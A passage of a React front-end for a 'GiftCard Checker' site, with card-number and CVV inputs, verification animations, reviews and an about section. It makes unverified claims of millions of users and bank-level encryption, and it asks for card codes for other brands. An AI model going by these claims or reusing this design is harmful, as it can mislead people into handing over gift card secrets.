                            className="w-full pl-12 pr-5 py-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-violet-500 focus:ring-2 focus:ring-violet-300/50 placeholder-gray-400 outline-none text-lg transition-all duration-300 hover:bg-white/15"
                          />
                          {cvv && (
                            <button 
                            type="button"
                            onClick={() => setCvv("")}
                            className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition-colors duration-200"
                            >
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                            </svg>
                            </button>
                          )}
                          </div>
                          {error.cvv && (
                          <p className="bg-red-500/10 border border-red-400/30 text-red-200 text-center text-sm font-medium rounded-lg p-3 animate-slide-up">{error.cvv}</p>
                          )}
                        </div>
                        </>
                      )}
                      </div>

                      {selectedCardId === "sephora" && (
                        <div>
                        <label className="flex items-center justify-between text-sm font-medium text-white/80 mb-1 px-1">
                        
                        <div className="relative">
                        <div className="absolute left-4 top-1/2 -translate-y-1/2">
                        
                        </div>
                        <input
                        value={cardNumber}
                        type="text"
                        inputMode="decimal"
                        aria-label="Card"
                        onChange={(e) => {
                          // Allow only numbers and decimal point, format as currency
                          const value = e.target.value.replace(/[^0-9.]/g, "");
                          // Prevent multiple decimal points
                          const formattedValue = value.split('.').length > 2 ? value.replace(/\./g, '').slice(0, -1) + '.' + value.split('.').pop() : value;
                          setCardNumber(formattedValue);
                        }}
                        placeholder="Enter the card number"
                        className="w-full pl-12 pr-5 py-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-violet-500 focus:ring-2 focus:ring-violet-300/50 placeholder-gray-400 outline-none text-lg transition-all duration-300 hover:bg-white/15"
                        />
                      </div>
                      </label>
                      </div>
                      )} 

                      {/* Add margin below the Expected Balance input for breathing space */}
                      <div className="space-y-2 mb-6">
                      <label className="flex items-center justify-between text-sm font-medium text-white/80 mb-1 px-1">
                        <span>Expected Balance</span>
                        <span className="text-xs text-violet-300">Optional</span>
                      </label>
                      <div className="relative">
                        <div className="absolute left-4 top-1/2 -translate-y-1/2">
                        <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        </div>
                        <input
                        value={price}
                        type="text"
                        inputMode="decimal"
                        aria-label="Expected Balance"
                        onChange={(e) => {
                          // Allow only numbers and decimal point, format as currency
                          const value = e.target.value.replace(/[^0-9.]/g, "");
                          // Prevent multiple decimal points
                          const formattedValue = value.split('.').length > 2 ? value.replace(/\./g, '').slice(0, -1) + '.' + value.split('.').pop() : value;
                          setPrice(formattedValue);
                        }}
                        placeholder="Do you know your current balance? (e.g. 25.99)"
                        className="w-full pl-12 pr-5 py-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-violet-500 focus:ring-2 focus:ring-violet-300/50 placeholder-gray-400 outline-none text-lg transition-all duration-300 hover:bg-white/15"
                        />
                      </div>
                      </div>
                      
                      {/* Enhanced Submit Button */}
              <button
                type="submit"
                disabled={loading || !selectedCardId}
                className={`w-full px-8 py-5 relative overflow-hidden text-white rounded-xl text-lg font-semibold shadow-xl transition-all duration-300 transform ${
                  !selectedCardId 
                    ? "bg-gray-500/50 cursor-not-allowed" 
                    : loading 
                      ? "bg-violet-500 scale-[0.98] cursor-not-allowed" 
                      : "bg-gradient-to-r from-violet-600 to-purple-600 hover:from-violet-700 hover:to-purple-700 hover:scale-[1.02] active:scale-[0.98] hover:shadow-2xl"
                }`}
              >
                {loading ? (
                  <div className="w-full relative">
                    {/* Premium loading experience */}
                    <div className="absolute inset-0 overflow-hidden rounded-xl">
                      {/* Scanning effect */}
                      <div className="absolute inset-x-0 h-1/4 bg-gradient-to-r from-transparent via-violet-400/20 to-transparent animate-scanning"></div>
                      
                      {/* Verification lines */}
                      <div className="absolute inset-0">
                        <div className="absolute inset-x-0 top-[20%] h-px bg-violet-500/20"></div>
                        <div className="absolute inset-x-0 top-[40%] h-px bg-violet-500/20"></div>
                        <div className="absolute inset-x-0 top-[60%] h-px bg-violet-500/20"></div>
                        <div className="absolute inset-x-0 top-[80%] h-px bg-violet-500/20"></div>
                      </div>
                      
                      {/* Moving verification scan */}
                      <div className="absolute inset-x-0 h-px bg-gradient-to-r from-transparent via-violet-400 to-transparent animate-verification-scan"></div>
                    </div>
                    
                    {/* Loading text animation */}
                    <div className="flex flex-col items-center justify-center py-3 relative z-10">
                      <div className="flex items-center gap-3 mb-1.5">
                        <div className="relative">
                          <div className="w-5 h-5 border-2 border-violet-200 border-t-transparent rounded-full animate-spin"></div>
                          <div className="absolute inset-0 w-5 h-5 border-2 border-transparent border-t-violet-100 rounded-full animate-spin" style={{animationDelay: '0.15s', animationDuration: '1.2s'}}></div>
                        </div>
                        <div className="text-base font-medium text-white relative overflow-hidden">
                          <div className="flex items-center animate-pulse" style={{animationDuration: '1.5s'}}>
                            <span className="inline-block" style={{animationDelay: '0.1s'}}>V</span>
                            <span className="inline-block" style={{animationDelay: '0.2s'}}>e</span>
                            <span className="inline-block" style={{animationDelay: '0.3s'}}>r</span>
                            <span className="inline-block" style={{animationDelay: '0.4s'}}>i</span>
                            <span className="inline-block" style={{animationDelay: '0.5s'}}>f</span>
                            <span className="inline-block" style={{animationDelay: '0.6s'}}>y</span>
                            <span className="inline-block" style={{animationDelay: '0.7s'}}>i</span>
                            <span className="inline-block" style={{animationDelay: '0.8s'}}>n</span>
                            <span className="inline-block" style={{animationDelay: '0.9s'}}>g</span>
                            <span className="inline-block mx-1.5">•</span>
                            <span className="inline-block" style={{animationDelay: '1.0s'}}>C</span>
                            <span className="inline-block" style={{animationDelay: '1.1s'}}>a</span>
                            <span className="inline-block" style={{animationDelay: '1.2s'}}>r</span>
                            <span className="inline-block" style={{animationDelay: '1.3s'}}>d</span>
                          </div>
                        </div>
                      </div>
                      
                      {/* Dynamic progress dots */}
                      <div className="flex gap-1.5 items-center">
                        <span className="text-xs text-violet-300 whitespace-nowrap">Secure check in progress</span>
                        <div className="flex gap-1">
                          <div className="w-1.5 h-1.5 bg-violet-300 rounded-full animate-bounce" style={{animationDelay: '0s'}}></div>
                          <div className="w-1.5 h-1.5 bg-violet-300 rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
                          <div className="w-1.5 h-1.5 bg-violet-300 rounded-full animate-bounce" style={{animationDelay: '0.4s'}}></div>
                        </div>
                      </div>
                    </div>
                  </div>
                ) : !selectedCardId ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    Please Select a Card Type First
                  </span>
                ) : (
                  <span className="flex items-center justify-center gap-3">
                    <svg className="w-6 h-6 transition-transform duration-200 group-hover:scale-110" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    Check Balance Now
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" />
                    </svg>
                  </span>
                )}
                
                {/* Enhanced effects */}
                {!loading && (
                  <>
                    <div className="absolute inset-0 bg-white opacity-0 hover:opacity-10 transition-opacity duration-300 rounded-xl"></div>
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700 ease-out"></div>
                  </>
                )}
                
                {loading && (
                  <div className="absolute inset-0 animate-shimmer"></div>
                )}
              </button>
            </form>

            {/* Enhanced Result Display */}
            {showResult && (
              <div className={`mt-10 p-8 rounded-2xl border-2 transition-all duration-500 ease-out transform ${
                resultType === "success" 
                  ? "bg-emerald-500/10 border-emerald-400/30 text-emerald-100 animate-slide-up shadow-[0_0_30px_rgba(16,185,129,0.3)]" 
                  : "bg-red-500/10 border-red-400/30 text-red-100 animate-slide-up shadow-[0_0_30px_rgba(239,68,68,0.3)]"
              }`}>
                <div className="flex items-start gap-6">
                  <div className={`w-16 h-16 rounded-2xl flex items-center justify-center ${
                    resultType === "success" 
                      ? "bg-emerald-500/20 text-emerald-300" 
                      : "bg-red-500/20 text-red-300"
                  }`}>
                    {resultType === "success" ? (
                      <svg className="w-8 h-8 animate-checkmark" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                      </svg>
                    ) : (
                      <svg className="w-8 h-8 animate-error-shake" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                      </svg>
                    )}
                  </div>
                  <div className="flex-1">
                    <h4 className={`text-xl font-bold mb-2 ${
                      resultType === "success" ? "text-emerald-200" : "text-red-200"
                    }`}>
                      {resultType === "success" ? "🎉 Balance Retrieved Successfully!" : "❌ Check Failed"}
                    </h4>
                    <p className="text-base opacity-90 leading-relaxed">{resultMessage}</p>
                    {resultType === "success" && (
                      <div className="mt-4 flex flex-wrap gap-2">
                        <span className="px-3 py-1 bg-emerald-500/20 text-emerald-300 rounded-full text-sm font-medium">Verified</span>
                        <span className="px-3 py-1 bg-emerald-500/20 text-emerald-300 rounded-full text-sm font-medium">Real-time</span>
                      </div>
                    )}
                  </div>
                  <button
                    onClick={() => setShowResult(false)}
                    className="text-gray-400 hover:text-white transition-colors duration-200 p-2 hover:bg-white/10 rounded-lg"
                  >
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                    </svg>
                  </button>
                </div>
              </div>
            )}
          </div>
        </section>
      </main>

      {/* Features Section */}
      <section id="features" className="py-20 bg-slate-800/40 backdrop-blur border-y border-white/10">
        <div className="max-w-6xl mx-auto px-6">
          <h3 className="text-center text-4xl text-white font-bold mb-4">Why Choose GiftCard Checker?</h3>
          <p className="text-center text-gray-300 mb-16 max-w-2xl mx-auto">
            Experience the most secure, fast, and reliable gift card balance checker trusted by millions worldwide.
          </p>
          <div className="grid gap-8 md:grid-cols-2 lg:grid-cols-4">
            {FEATURES.map((feature, index) => (
              <div
                key={index}
                className="bg-white/5 backdrop-blur-md p-8 rounded-2xl hover:bg-white/10 transition-all duration-300 hover:scale-105 border border-white/10 hover:border-white/20 group"
              >
                <div className="text-4xl mb-4 group-hover:scale-110 transition-transform duration-300">{feature.icon}</div>
                <h4 className="text-xl font-bold text-white mb-3">{feature.title}</h4>
                <p className="text-gray-300 leading-relaxed">{feature.description}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Enhanced Reviews */}
      <section id="reviews" className="bg-slate-800/60 backdrop-blur py-20 border-t border-white/10">
        <div className="max-w-7xl mx-auto px-6">
          <h3 className="text-center text-4xl text-white font-bold mb-4">Trusted by Gift Card Users Worldwide</h3>
          <p className="text-center text-gray-300 mb-16 max-w-2xl mx-auto">
            Join millions of satisfied users who trust GiftCard Checker for accurate, instant balance verification.
          </p>
          <div className="grid gap-8 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
            {REVIEWS.slice(0, 8).map((review) => (
              <div
                key={review.id}
                className="bg-white/5 backdrop-blur-md p-6 rounded-2xl shadow-xl hover:scale-[1.02] transition-all duration-300 border border-white/10 text-white hover:shadow-2xl group"
              >
                <div className="flex items-center gap-4 mb-4">
                  <div className="w-12 h-12 bg-gradient-to-br from-violet-500 to-purple-600 text-white rounded-full flex items-center justify-center font-bold text-lg shadow-lg">
                    {review.name.charAt(0)}
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <h4 className="font-bold">{review.name}</h4>
                      {review.verified && (
                        <div className="w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center">
                          <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                          </svg>
                        </div>
                      )}
                    </div>
                    <div className="text-sm text-gray-400">{review.location}</div>
                  </div>
                </div>
                <p className="leading-relaxed italic mb-4 text-gray-200">"{review.text}"</p>
                <div className="flex items-center justify-between">
                  <div className="flex text-yellow-400">
                    {[...Array(review.rating)].map((_, i) => (
                      <svg key={i} className="w-4 h-4 fill-current" viewBox="0 0 20 20">
                        <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                      </svg>
                    ))}
                  </div>
                  {review.verified && (
                    <span className="text-xs text-blue-400 font-medium">Verified User</span>
                  )}
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Enhanced About Section */}
      <section id="about" className="py-24 bg-gradient-to-br from-slate-900 to-slate-800 border-t border-white/10">
        <div className="max-w-6xl mx-auto px-6">
          <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-12 space-y-8 text-white relative overflow-hidden">
            {/* Background decoration */}
            <div className="absolute top-0 right-0 w-64 h-64 bg-gradient-to-br from-violet-500/10 to-purple-500/10 rounded-full filter blur-3xl"></div>
            <div className="absolute bottom-0 left-0 w-48 h-48 bg-gradient-to-tr from-blue-500/10 to-cyan-500/10 rounded-full filter blur-3xl"></div>
            
            <div className="relative">
              <h3 className="text-4xl font-bold text-center mb-6">About GiftCard Checker</h3>
              <div className="w-24 h-1 bg-gradient-to-r from-violet-500 to-purple-500 mx-auto mb-8 rounded-full"></div>
              
              <div className="grid md:grid-cols-2 gap-12 items-center">
                <div className="space-y-6">
                  <p className="text-lg leading-relaxed opacity-90">
                    Gift cards are awesome until you're stuck wondering what's left on them. That's where we come in.
                  </p>
                  <p className="text-lg leading-relaxed opacity-90">
                    <strong className="text-violet-300">GiftCard Checker</strong> gives you a fast, secure way to see your remaining balance. Whether it's Amazon, iTunes, Steam, or Google Play – we've got you covered.
                  </p>
                  
                  <div className="grid grid-cols-2 gap-6 mt-8">
                    <div className="text-center p-4 bg-white/5 rounded-xl border border-white/10">
                      <div className="text-2xl font-bold text-violet-300">50+</div>
                      <div className="text-sm text-gray-400">Countries Supported</div>
                    </div>
                    <div className="text-center p-4 bg-white/5 rounded-xl border border-white/10">
                      <div className="text-2xl font-bold text-violet-300">10+</div>
                      <div className="text-sm text-gray-400">Card Brands</div>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-6">
                  <h4 className="text-2xl font-bold text-violet-300 mb-4">What Makes Us Different</h4>
                  <ul className="space-y-4">
                    <li className="flex items-start gap-3">
                      <div className="w-6 h-6 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                      </div>
                      <div>
                        <strong className="text-white">No ads. No tricks.</strong>
                        <div className="text-gray-400">Just clean, honest results every time.</div>
                      </div>
                    </li>
                    <li className="flex items-start gap-3">
                      <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M3 6a3 3 0 013-3h10a1 1 0 01.8 1.6L14.25 8l2.55 3.4A1 1 0 0116 13H6a1 1 0 00-1 1v3a1 1 0 11-2 0V6z" clipRule="evenodd" />
                        </svg>
                      </div>
                      <div>
                        <strong className="text-white">Global reach.</strong>
                        <div className="text-gray-400">Works worldwide on major gift card brands.</div>
                      </div>
                    </li>
                    <li className="flex items-start gap-3">
                      <div className="w-6 h-6 bg-purple-500 rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                        </svg>
                      </div>
                      <div>
                        <strong className="text-white">Bank-level security.</strong>
                        <div className="text-gray-400">End-to-end encryption for total privacy and peace of mind.</div>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
              
              <div className="text-center mt-12 p-6 bg-violet-500/10 border border-violet-400/30 rounded-2xl">
                <p className="text-lg italic text-violet-200">
                  "Built with care for people who just want to know what's left on that card in their drawer."
                </p>
                <div className="mt-4 text-sm text-violet-300">— The GiftCard Checker Team</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Enhanced Footer */}
      <footer className="bg-slate-900 border-t border-white/10 text-center py-12">
        <div className="max-w-6xl mx-auto px-6">
          <div className="flex flex-col md:flex-row items-center justify-between gap-6">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-gradient-to-br from-violet-500 to-purple-600 rounded-lg flex items-center justify-center">
                <span className="text-lg">🎁</span>
              </div>
              <div className="text-left">
                <div className="text-white font-bold">GiftCard Checker</div>
                <div className="text-xs text-gray-400">Trusted since 2022</div>
              </div>
            </div>
            
            <div className="flex items-center gap-8 text-sm text-gray-400">
              <a href="#privacy" className="hover:text-white transition-colors">Privacy Policy</a>
              <a href="#terms" className="hover:text-white transition-colors">Terms of Service</a>
              <a href="#contact" className="hover:text-white transition-colors">Contact</a>
            </div>
            
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <div className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse"></div>
              <span>All systems operational</span>
            </div>
          </div>
          
          <div className="mt-8 pt-8 border-t border-white/10 text-sm text-gray-500">
            <p>&copy; 2024 GiftCard Checker. All rights reserved. | Protecting 2.5M+ users worldwide.</p>
          </div>
        </div>
      </footer>

      {/* Card Selection Modal */}
      {isModalOpen && (
        <div className="fixed inset-0 flex items-center justify-center z-50 bg-black/80 backdrop-blur-sm">
          <div className="bg-gradient-to-br from-gray-900 to-black max-w-4xl w-full mx-4 rounded-2xl shadow-2xl overflow-hidden border border-white/10 p-6 max-h-[90vh] flex flex-col">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-2xl font-bold text-white">Select a Gift Card</h2>
              <button
                onClick={closeModal}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            
            <div className="overflow-y-auto custom-scrollbar flex-grow">
              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
                {CARD_TYPES.map((card) => (
                  <div
                    key={card.id}
                    onClick={() => handleSelectCard(card.id)}
                    className={`relative group cursor-pointer flex flex-col items-center p-4 rounded-xl transition-all duration-300 ${
                      selectedCardId === card.id ? "bg-gradient-to-br from-violet-500/30 to-purple-500/30" : "bg-white/10 hover:bg-white/15"
                    }`}
                  >
                    <div className="w-20 h-20 flex items-center justify-center mb-2 rounded-lg overflow-hidden">
                      <img
                        src={card.img}
                        alt={card.name}
                        className={`w-full h-full object-contain transition-transform duration-500 ${selectedCardId === card.id ? "scale-110" : "group-hover:scale-110"}`}
                      />
                    </div>
                    <span className="text-sm font-medium text-white">{card.name}</span>
                    <span className="text-xs text-gray-400">{card.category}</span>
                    
                    {selectedCardId === card.id && (
                      <div className="absolute -top-1 -right-1 bg-gradient-to-r from-violet-500 to-purple-500 w-6 h-6 rounded-full flex items-center justify-center shadow-lg">
                        <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
            
            <div className="mt-6 flex justify-end">
              <button
                onClick={closeModal}
                className="px-5 py-2 bg-white/10 hover:bg-white/20 text-white rounded-lg mr-3 transition-colors"
              >
                Cancel
              </button>
              <button
                onClick={closeModal}
                className="px-5 py-2 bg-gradient-to-r from-violet-600 to-purple-600 hover:from-violet-700 hover:to-purple-700 text-white rounded-lg font-medium transition-colors"
              >
                Confirm Selection
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
